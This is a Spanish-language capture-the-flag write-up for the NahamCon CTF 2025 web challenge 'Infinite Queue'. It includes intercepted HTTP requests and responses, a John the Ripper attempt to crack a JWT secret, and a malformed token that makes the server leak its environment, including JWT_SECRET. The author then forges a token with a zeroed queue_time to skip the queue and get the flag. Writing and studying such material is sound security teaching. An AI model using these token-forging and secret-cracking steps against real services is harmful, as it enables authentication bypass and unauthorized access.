+++
title = "NahamCon CTF 2025 | Infinite Queue"
date = "2025-06-12T13:14:58-06:00"
author = "corrupter"
authors = ["corrupter"]
tags = ["Writeup", "Red Team", "Web", "Secure Coding"]
showFullContent = false
hideComments = true 
+++

## Introducción

Recientemente se llevó a cabo una de las conferencias virtuales más notorias de
ciberseguridad: "NahamCon" y, como es tradición, acompañado de esta se realizó su
respectivo CTF.

Dicho CTF contaba con retos en diversas áreas ya clásicas en competencias de este estilo;
particularmente, este _writeup_ se centra en uno de la categoría _Web_: _inifinite queue_
que nos sitúa hasta el final de fila ficticia para adquirir boletos del tour de una banda famosa.

{{< image src="/img/nahamcon_ctf_2025_infinite_queue/home.png" alt="img1" position="center" >}}

Este reto requiere explotar una vulnerabilidad sobre un método de autenticación muy usado
actualmente: _JSON Web Tokens_ (JWTs) y que, a diferencia de ataques clásicos
que explotan secretos débiles, aprovecha malas configuraciones dejadas por el equipo de
desarrollo en el _backend_ de la aplicación.

## Desarrollo

Lo primero que siempre realizo al tener un reto de esta categoría en frente es una
inspección manual para ver el comportamiento de la aplicación. Al ingresar al dominio
notamos que tenemos que crear una cuenta para entrar en la fila de compra de boletos.

Tras crear una cuenta, se nos muestra el mensaje _"You are in the queue!
Estimated wait time: 9529 minutes"_. Lo que tenemos que hacer ahora es inspeccionar
las peticiones HTTP que se realizan entre nuestro navegador y la aplicación. Para ello,
usé `BurpSuite`. Interceptamos primero la petición de registro

**Petición:**

```sh
POST /join_queue HTTP/1.1
Host: challenge.nahamcon.com:31075
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://challenge.nahamcon.com:32642/queue
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
Origin: http://challenge.nahamcon.com:32642
Connection: keep-alive
Priority: u=0

user_id=a%40a.a
```

**Respuesta:**

```sh
HTTP/1.1 200 OK
Server: Werkzeug/3.1.3 Python/3.9.22
Date: Sat, 24 May 2025 16:54:22 GMT
Content-Type: application/json
Content-Length: 252
Connection: close

{
"message":"You are in the queue! Estimated wait time: 9529 minutes",
"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiYUBhLmEiLCJxdWV1ZV90aW1lIjoxNzYwNzkzMzIyLjQwNTUxNywiZXhwIjo1MzQ4MTAyMDYyfQ.S4KRGUg5_eKr7k0orR7ADu_XiWeaxQdgr144gYatYCk"
}
```

Vemos que el servidor regresa un token. La estructura parece ser la de un token JWT.
Si lo decodificamos, obtenemos la siguiente información:

```sh
# Header
{
  "alg": "HS256",
  "typ": "JWT"
}
#Claims
{
  "user_id": "a@a.a",
  "queue_time": 1760793322.405517,
  "exp": 5348102062
}
```

La idea es ver qué podemos hacer con este token. Vemos que el sistema
responde con lo siguiente al consultar el estatus de la cola:

**Petición:**

```sh
POST /check_queue HTTP/1.1
Host: challenge.nahamcon.com:31075
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://challenge.nahamcon.com:31075/queue
Content-Type: application/x-www-form-urlencoded
Content-Length: 177
Origin: http://challenge.nahamcon.com:31075
Connection: keep-alive
Priority: u=4

token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiYUBhLmEiLCJxdWV1ZV90aW1lIjoxNzk5NTI3NDU4LjQyMjEwOSwiZXhwIjo1MzQ4MDM3MTM4fQ.ABchR3XbT9gBcyisqU_ZB48sxnnLKOos2SuMtHLlMzw
```

**Respuesta:**

```sh
HTTP/1.1 200 OK
Server: Werkzeug/3.1.3 Python/3.9.22
Date: Fri, 23 May 2025 22:52:52 GMT
Content-Type: application/json
Content-Length: 136
Connection: close

{
"message":"Still waiting in queue. Estimated time: 858111 minutes",
"queue_position":61783992,
"status":"waiting",
"wait_minutes":858111
}
```

Tras esto, se me ocurrió que podríamos forjar nuestro token, modificando el _claim_
`queue_time` y saltar la fila, pero para ello
necesitaríamos el secreto con el que se firmó el mismo. Lo primero que verifiqué es si se
trataba de algún secreto débil con `john`:

```sh
$ john --format=HMAC-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt token.jwt

Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:02 DONE (2025-05-24 11:08) 0g/s 5352Kp/s 5352Kc/s 5352KC/s "chinor23"..*7¡Vamos!
Session completed.
```

También se intentó crear una _wordlist_ personalizada con `cewl` sobre la
URL raíz, pero de igual forma no se pudo obtener el secreto. Indagando
en la página principal del sitio el footer tenía carácteres que me parecieron
interesantes: `ftjy` así que procedí a usarlos como secreto. Al reenviar el
token sobre el mismo _endpoint_, esto provoca que se dispare un error del
lado del servidor y obtenemos información _muy_ interesante:

**Petición:**

```sh
POST /check_queue HTTP/1.1
Host: challenge.nahamcon.com:31075
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://challenge.nahamcon.com:31075/queue
Content-Type: application/x-www-form-urlencoded
Content-Length: 151
Origin: http://challenge.nahamcon.com:31075
Connection: keep-alive
Priority: u=4

token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiYUBhLmEiLCJxdWV1ZV90aW1lIjoxNzYwNzkzMzIyLjQwNTUxNywiZXhwIjo1MzQ4MTAyMDYyfQ.ymFVmpr70Q4-TycbU
```

**Respuesta:**

```sh
HTTP/1.1 500 INTERNAL SERVER ERROR
Server: Werkzeug/3.1.3 Python/3.9.22
Date: Sat, 24 May 2025 17:05:03 GMT
Content-Type: application/json
Content-Length: 1080
Connection: close

{
"error":"An unexpected error occurred",
"error_details":
  {"debug_mode":false,
   "environment":
    {
      "GPG_KEY":"E3FF2839C048B25C084DEBE9B26995E310250568",
      "HOME":"/root",
      "HOSTNAME":"infinite-queue-0ca560b3c629abff-6466846744-2qdnw",
      "JWT_SECRET":"4A4Dmv4ciR477HsGXI19GgmYHp2so637XhMC",
      "KUBERNETES_PORT":"tcp://34.118.224.1:443",
      "KUBERNETES_PORT_443_TCP":"tcp://34.118.224.1:443",
      "KUBERNETES_PORT_443_TCP_ADDR":"34.118.224.1",
      "KUBERNETES_PORT_443_TCP_PORT":"443",
      "KUBERNETES_PORT_443_TCP_PROTO":"tcp",
      "KUBERNETES_SERVICE_HOST":"34.118.224.1",
      "KUBERNETES_SERVICE_PORT":"443",
      "KUBERNETES_SERVICE_PORT_HTTPS":"443",
      "LANG":"C.UTF-8",
      "PATH":"/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","PYTHON_SHA256":"8c136d199d3637a1fce98a16adc809c1d83c922d02d41f3614b34f8b6e7d38ec","PYTHON_VERSION":"3.9.22","WERKZEUG_SERVER_FD":"3"},"error":"Invalid crypto padding","request_data":{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiYUBhLmEiLCJxdWV1ZV90aW1lIjoxNzYwNzkzMzIyLjQwNTUxNywiZXhwIjo1MzQ4MTAyMDYyfQ.ymFVmpr70Q4-TycbU"},"time":"2025-05-24T17:05:03.023602"
  }
}
```

¡Bingo! Ya podemos forjar nuestro token. Dado que lo que parece determinar
si seguimos en espera es el _claim_ `queue_time`, entonces lo modificamos
con el valor `00000.00000`. Podemos firmar nuestro token con el secreto
obtenido y enviarlo:

**Petición:**

```sh
POST /check_queue HTTP/1.1
Host: challenge.nahamcon.com:31075
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://challenge.nahamcon.com:31075/queue
Content-Type: application/x-www-form-urlencoded
Content-Length: 158
Origin: http://challenge.nahamcon.com:31075
Connection: keep-alive
Priority: u=4

token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiYUBhLmEiLCJxdWV1ZV90aW1lIjowLjEsImV4cCI6NTM0ODAzNjQ5MH0.A-KeWH05z3ZmQo22_XbzB67LV7ITw_hrAPlFxunQ3aU
```

**Respuesta:**

```sh
HTTP/1.1 200 OK
Server: Werkzeug/3.1.3 Python/3.9.22
Date: Fri, 23 May 2025 23:00:12 GMT
Content-Type: application/json
Content-Length: 84
Connection: close

{
"message":"Your turn has arrived! You can now purchase tickets.",
"status":"ready"
}
```

Si optamos por usar el token en el navegador, veriamos que la compra puede realizarse y basta con dar
click en el boton para obtener la flag. Usando `BurpSuite`, podíamos mandar una petición a
`/purchase` de la siguiente forma:

**Petición:**

```sh
POST /purchase?html=true HTTP/1.1
Host: challenge.nahamcon.com:31075
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://challenge.nahamcon.com:31075/queue
Content-Type: application/x-www-form-urlencoded
Content-Length: 158
Origin: http://challenge.nahamcon.com:31075
Connection: keep-alive
Priority: u=4

token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiYUBhLmEiLCJxdWV1ZV90aW1lIjowLjEsImV4cCI6NTM0ODAzNjQ5MH0.A-KeWH05z3ZmQo22_XbzB67LV7ITw_hrAPlFxunQ3aU
```

**Respuesta:**

```sh
HTTP/1.1 200 OK
Server: Werkzeug/3.1.3 Python/3.9.22
Date: Fri, 23 May 2025 23:00:14 GMT
Content-Type: application/json
Content-Length: 98
Connection: close

{
"flag":"flag{<--REDACTED-->}",
"message":"Purchase successful!",
"success":true
}
```

De esta forma, hemos conseguido la bandera para este reto.

## Referencias útiles

- [jwt.io](https://jwt.io/)
